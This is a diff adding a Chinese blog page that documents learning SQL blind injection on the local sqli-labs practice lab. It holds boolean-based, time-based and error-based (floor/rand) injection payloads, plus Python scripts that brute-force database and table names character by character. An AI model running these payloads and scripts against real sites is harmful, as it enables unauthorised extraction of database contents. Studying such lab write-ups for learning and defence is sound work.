@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="系统总结,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这几天在学习sql注入的有关内容，今天记录一下我认为比较重要的部分，即sql盲注，我一开始学习的时候看到了好多的函数，看着看着就弄混了，相信不少新入门的师傅也有类似的困惑，经过多番心理斗争，我终于决定将这部分知识好整理一下，同时也给大家分享一下我在学习过程中编写的几个自动注入脚本，也欢迎各位师傅的指点和斧正。 函数整理这里我先将所用到的功能函数整理一下，同时也欢迎各位师傅的补充和纠正 left(m">
+<meta name="keywords" content="系统总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql盲注的学习">
+<meta property="og:url" content="https://yml-sec.top/2019/03/23/sql盲注的学习/index.html">
+<meta property="og:site_name" content="yemoli&#39;s blog">
+<meta property="og:description" content="这几天在学习sql注入的有关内容，今天记录一下我认为比较重要的部分，即sql盲注，我一开始学习的时候看到了好多的函数，看着看着就弄混了，相信不少新入门的师傅也有类似的困惑，经过多番心理斗争，我终于决定将这部分知识好整理一下，同时也给大家分享一下我在学习过程中编写的几个自动注入脚本，也欢迎各位师傅的指点和斧正。 函数整理这里我先将所用到的功能函数整理一下，同时也欢迎各位师傅的补充和纠正 left(m">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/1.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/2.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/3.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/5.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/4.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/6.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/7.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/8.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/9.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/11.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/12.jpg">
+<meta property="og:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/13.jpg">
+<meta property="og:updated_time" content="2019-03-23T13:56:57.885Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql盲注的学习">
+<meta name="twitter:description" content="这几天在学习sql注入的有关内容，今天记录一下我认为比较重要的部分，即sql盲注，我一开始学习的时候看到了好多的函数，看着看着就弄混了，相信不少新入门的师傅也有类似的困惑，经过多番心理斗争，我终于决定将这部分知识好整理一下，同时也给大家分享一下我在学习过程中编写的几个自动注入脚本，也欢迎各位师傅的指点和斧正。 函数整理这里我先将所用到的功能函数整理一下，同时也欢迎各位师傅的补充和纠正 left(m">
+<meta name="twitter:image" content="https://yml-sec.top/2019/03/23/sql盲注的学习/img/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yml-sec.top/2019/03/23/sql盲注的学习/">
+
+
+
+
+
+  <title>sql盲注的学习 | yemoli's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yemoli's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/03/23/sql盲注的学习/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="夜莫离、">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yemoli's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sql盲注的学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-23T21:55:55+08:00">
+                2019-03-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这几天在学习sql注入的有关内容，今天记录一下我认为比较重要的部分，即sql盲注，我一开始学习的时候看到了好多的函数，看着看着就弄混了，相信不少新入门的师傅也有类似的困惑，经过多番心理斗争，我终于决定将这部分知识好整理一下，同时也给大家分享一下我在学习过程中编写的几个自动注入脚本，也欢迎各位师傅的指点和斧正。</p>
+<h1 id="函数整理"><a href="#函数整理" class="headerlink" title="函数整理"></a>函数整理</h1><p>这里我先将所用到的功能函数整理一下，同时也欢迎各位师傅的补充和纠正</p>
+<pre><code>left(m,n) #从左向右截取字符串m返回其前n位
+
+substr(m,1,2) #取字符串m的左边第一位起，2字长的字符串
+
+ascii(m) #返回字符m的ASCII码
+
+if(str1,str2,str3) #如果str1正确就执行str2，否则执行str3
+
+sleep(m) #使程序暂停m秒
+
+lenhth(m) #返回字符串m的长度
+
+count(column_name) #返回指定列的值的数目
+</code></pre><h2 id="concat-函数和group-concat-区别"><a href="#concat-函数和group-concat-区别" class="headerlink" title="concat()函数和group_concat()区别"></a>concat()函数和group_concat()区别</h2><p><strong>concat()</strong></p>
+<p>该函数用于联合两条数据结果，通常是联合两个字段名，如concat(username,0x23,passwd),数据将由#分割开</p>
+<p><strong>group_concat()</strong></p>
+<p>这个函数与concat()用法是类似的，但如果管理员账号不止一个的话，concat一次只能注出一组用户名密码，而使用group_concat()可以实现一次注出多组数据。</p>
+<h1 id="盲注类型"><a href="#盲注类型" class="headerlink" title="盲注类型"></a>盲注类型</h1><h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><p><strong>特征</strong></p>
+<p>被注入的页面没有sql语句执行错误的显示，页面只有正常返回和不正常返回两种状态</p>
+<p><strong>示例</strong></p>
+<p>这里我拿sqli-labs的less8作为布尔型盲注的例子</p>
+<p>我们可以看到这个页面正常会返回You are in………..而不正常的时候会无任何返回，这就很符合布尔盲注的特征</p>
+<p>正常返回：</p>
+<p><img src="/2019/03/23/sql盲注的学习/img/1.jpg" alt="avatar"></p>
+<p>非正常返回：</p>
+<p><img src="/2019/03/23/sql盲注的学习/img/2.jpg" alt=""></p>
+<p>构造?id=1’ and 1=1 %23时正常返回</p>
+<p><img src="/2019/03/23/sql盲注的学习/img/3.jpg" alt=""></p>
+<p>这里基本就可以确定可以使用布尔盲注来获得数据库中的数据</p>
+<p>接下来我们来猜解库名，在猜解库名之前，我们首先需要知道库名的长度</p>
+<p>这里我们就可以利用length()函数来进行长度的爆破：</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and (length(database())=m) %23 //m=1,2,3,4.....
+</code></pre><p>代码如下：</p>
+<p><img src="/2019/03/23/sql盲注的学习/img/5.jpg" alt=""></p>
+<p>结果</p>
+<p><img src="/2019/03/23/sql盲注的学习/img/4.jpg" alt=""></p>
+<p>接下来开始进行库名的猜解，这里用到了ascii()函数和substr()函数，具体的语句如下：</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr(database(),m,1))=n %23 //其中m 和 n是可变的参数
+</code></pre><p>猜解库名的自动化脚本函数如下：</p>
+<p><img src="/2019/03/23/sql盲注的学习/img/6.jpg" alt=""></p>
+<p>结果如下：</p>
+<p><img src="/2019/03/23/sql盲注的学习/img/7.jpg" alt=""></p>
+<p>猜解表名和字段和猜解库名是一样的，篇幅原因将代码直接放出：</p>
+<pre><code>import requests
+def get_dblength(base_url):
+    url = base_url+&quot;&apos; and (length(database())={0}) %23&quot;
+    base_num = 100
+    for i in range(0,base_num):
+        url1 = url.format(i)
+        print(url1)
+        result = len(requests.get(url1).text)
+        if result  == base_result:
+            print(&quot;库名长度:&quot;,i)
+            break
+    return i
+
+def get_dbname(base_url,db_length):
+    dict = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&apos;
+    dbname = &quot;&quot;
+    url = base_url+&quot;&apos; and ascii(substr(database(),{0},1))={1} %23&quot;
+    for i in range(1,db_length+1):
+        for m in dict:
+            m_ascii = ord(m)
+            url2 = url.format(i,m_ascii)
+            result = requests.get(url2)
+            if len(result.text) == base_result:
+                dbname += m
+                print(dbname)
+                break
+    print(&quot;库名:&quot;,dbname)
+
+def get_table_length():
+    url = base_url + &quot;&apos; and (select length(table_name) from information_schema.tables where table_schema = database() limit {0},1)={1}%23&quot;
+    for i in range(0,20):
+        url1 = url.format(2,i)
+        result = requests.get(url1)
+        if base_result == len(result.text):
+            print(&quot;表名长度:&quot;,i)
+            break
+    return i
+
+def get_table_name(table_length):
+    dict = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&apos;
+    table_name = &quot;&quot;
+    url = base_url + &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit {0},1),{1},1))={2} %23&quot;
+    for i in range(1,table_length + 1):
+        for m in dict:
+            ascii_m = ord(m)
+            url1 = url.format(2,i,ascii_m)
+            result = requests.get(url1).text
+            if base_result == len(result):
+                table_name +=m
+                print(&quot;表名:&quot;,table_name)
+                break
+    return table_name
+
+if __name__ == &apos;__main__&apos;:
+    base_url = &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot;
+    base_result = len(requests.get(base_url).text)
+    dblength = get_dblength(base_url)
+    get_dbname(base_url, dblength)
+    get_table_length()
+    get_table_name(7)
+</code></pre><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p><strong>特征</strong></p>
+<p>被注入页面无论作何输入都回显相同的数据，导致我们无法判断注入是否成功，这时我们就可以使用以sleep()函数为核心的注入语句进行延时注入</p>
+<p><strong>示例</strong></p>
+<p>以sqli-labs less9作为示例</p>
+<p><img src="/2019/03/23/sql盲注的学习/img/8.jpg" alt=""></p>
+<p>不管我们输入什么页面都显示You are in………..这时我们就可以用延时注入的方法进行数据库数据的获取</p>
+<p>同样我们需要先获取库名的长度，然后再获取库名</p>
+<p>这里主要使用到了sleep(),substr()和length()函数</p>
+<p>获取库名长度：</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if((length((select database()))=m),sleep(5),NULL) %23//其中m为整型可变参数，如果猜解正确，页面将会暂停响应5秒
+</code></pre><p>获取库名：</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if((substr((select database()),m,1)=&apos;n&apos;),sleep(5),NULL) %23//其中m为整形,n为char型可变参数
+</code></pre><p>爆破代码：</p>
+<pre><code>import requests
+
+def db_post(url):
+    try:
+        result = requests.get(url,timeout=4)
+        return 0
+    except:
+        return 1
+def get_db_length():
+    url = base_url + &quot;&apos; and if((length((select database()))={0}),sleep(5),NULL) %23&quot;
+    for i in range(0,20):
+        url1 = url.format(i)
+        temp = db_post(url1)
+        if temp == 1:
+            print(&quot;数据库名长度:&quot;,i)
+            break
+    return i
+
+def get_db_name(db_length):
+    db_name = &quot;&quot;
+    url = base_url + &quot;&apos; and if((substr((select database()),{0},1)=&apos;{1}&apos;),sleep(5),NULL) %23&quot;
+    print(&quot;开始猜解库名&quot;)
+    for i in range(1,db_length+1):
+        for m in dict:
+            url1 = url.format(i,m)
+            temp = db_post(url1)
+            if temp == 1:
+                db_name += m
+                print(db_name)
+                break
+    print(&quot;库名：&quot;,db_name)
+    return db_name
+
+if __name__ == &apos;__main__&apos;:
+    dict = &apos;abcdefghijklmnopqrstuvwxyz&apos;
+    base_url = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&quot;
+    db_length = get_db_length()
+    get_db_name(db_length)
+</code></pre><p>可以看到成功将库名猜解出来</p>
+<p><img src="/2019/03/23/sql盲注的学习/img/9.jpg" alt=""></p>
+<p>剩下的表名和字段将脚本稍作修改即可猜解出来，篇幅原因不再重复操作</p>
+<h2 id="基于报错的盲注-floor报错注入"><a href="#基于报错的盲注-floor报错注入" class="headerlink" title="基于报错的盲注(floor报错注入)"></a>基于报错的盲注(floor报错注入)</h2><p><strong>原理</strong></p>
+<p>该类型的注入利用了mysql的8652号BUG(官方链接:<a href="https://bugs.mysql.com/bug.php?id=8652" target="_blank" rel="noopener">https://bugs.mysql.com/bug.php?id=8652</a>)，当使用group by对某些rand函数操作时，会返回带有敏感信息的错误信息，我们可以通过特定的sql语句组合来控制返回敏感信息的内容，从而实现间接的注入</p>
+<p><strong>示例</strong></p>
+<p>对于BUG触发的原理本篇不做分析，通过对该类型注入的资料收集，根据网络上的payload我整理了一份有效的注入语句</p>
+<p>以sqli-labs less5为实际示例</p>
+<p>这里要用到concat和count函数</p>
+<p>回显库名：</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select 1,count(*),concat(&quot;-&quot;,&quot;-&quot;,(select database()),&quot;-&quot;,&quot;-&quot;,floor(rand(0)*2))a from information_schema.columns group by a %23
+</code></pre><p><img src="/2019/03/23/sql盲注的学习/img/11.jpg" alt=""></p>
+<p>接下来是表名的注入，我们同样需要知道表名的个数：</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select 1,count(*),concat(&quot;-&quot;,&quot;-&quot;,(select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;),&quot;-&quot;,&quot;-&quot;,floor(rand(0)*2))a from information_schema.columns group by a %23
+</code></pre><p><img src="/2019/03/23/sql盲注的学习/img/12.jpg" alt=""></p>
+<p>表名有四个，接着注出表名：</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select 1,count(*),concat(&quot;-&quot;,&quot;-&quot;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),&quot;-&quot;,&quot;-&quot;,floor(rand(0)*2))a from information_schema.columns group by a %23
+</code></pre><p><img src="/2019/03/23/sql盲注的学习/img/13.jpg" alt=""></p>
+<p>想注出全部表名修改limit参数即可</p>
+<p>列名和数据同理修改查询语句就可以了。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>盲注是一个比较费神和考验逻辑的注入方式，在注入的过程中会做很多相同的工作，为了节省时间和精力，建议大家在平时练习的时候多编写自动脚本，这样能节省很多时间，避免做更多重复无用的工作</p>
+<p>最后再次祝愿安恒学院越办越好，祝各位师傅的技术水平越来越高。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="夜莫离、 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="夜莫离、 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/系统总结/" rel="tag"># 系统总结</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/10/浅谈几种Python源代码加密技术/" rel="next" title="浅谈几种Python源代码加密技术">
+                <i class="fa fa-chevron-left"></i> 浅谈几种Python源代码加密技术
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">夜莫离、</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yemoli" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.baidu.com/" title="Baidu" target="_blank">Baidu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chxing.xyz/" title="Bling_Dog" target="_blank">Bling_Dog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.smi1e.top/" title="Smi1e" target="_blank">Smi1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://altman.vip/" title="Altman" target="_blank">Altman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virtua1.cn/" title="Virtua1" target="_blank">Virtua1</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#函数整理"><span class="nav-number">1.</span> <span class="nav-text">函数整理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#concat-函数和group-concat-区别"><span class="nav-number">1.1.</span> <span class="nav-text">concat()函数和group_concat()区别</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#盲注类型"><span class="nav-number">2.</span> <span class="nav-text">盲注类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基于布尔的盲注"><span class="nav-number">2.1.</span> <span class="nav-text">基于布尔的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">2.2.</span> <span class="nav-text">基于时间的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于报错的盲注-floor报错注入"><span class="nav-number">2.3.</span> <span class="nav-text">基于报错的盲注(floor报错注入)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">夜莫离、</span>
+
+  
+</div>
+
+
+  <!-- <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div> 
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>-->
+
+
+
+<div class="theme-info">
+ <div class="powered-by"></div>
+ <span class="post-count">博客全站共32.6k字</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
